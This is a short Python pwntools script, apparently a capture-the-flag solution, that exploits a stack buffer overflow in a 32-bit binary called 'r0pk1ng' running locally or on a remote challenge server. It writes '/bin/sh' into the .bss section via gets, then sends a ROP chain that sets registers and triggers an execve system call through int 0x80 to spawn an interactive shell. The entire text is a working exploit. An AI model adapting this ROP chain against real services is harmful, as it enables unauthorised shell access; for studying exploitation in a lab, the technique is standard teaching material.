from pwn import *

elf = ELF('./r0pk1ng')

if args.LOCAL:
	p = elf.process()
else:
	host = 'gc1.eng.run'
	port = 30048
	p = remote(host, port)

p.recvlines(2)

pop_eax = 0x0804925e
pop_ebx = 0x08049022
pop_ecx = 0x08049262
pop_edx = 0x08049264
int_80 = 0x08049266
bss = 0x804c030

payload = b'A' * 36
payload += p32(elf.plt['gets'])
payload += p32(elf.symbols['vuln'])
payload += p32(bss)

p.sendline(payload)
p.sendline(b'/bin/sh\x00')

payload = b'A' * 36
payload += p32(pop_ecx)
payload += p32(0x0)					# write 0 into ecx
payload += p32(pop_edx)
payload += p32(0x0)					# write 0 into edx
payload += p32(pop_ebx)
payload += p32(bss)					# write (bss) address into ebx
payload += p32(pop_eax)
payload += p32(0xb)					# write 11 into eax
payload += p32(int_80)		

p.sendline(payload)

p.interactive()
p.close()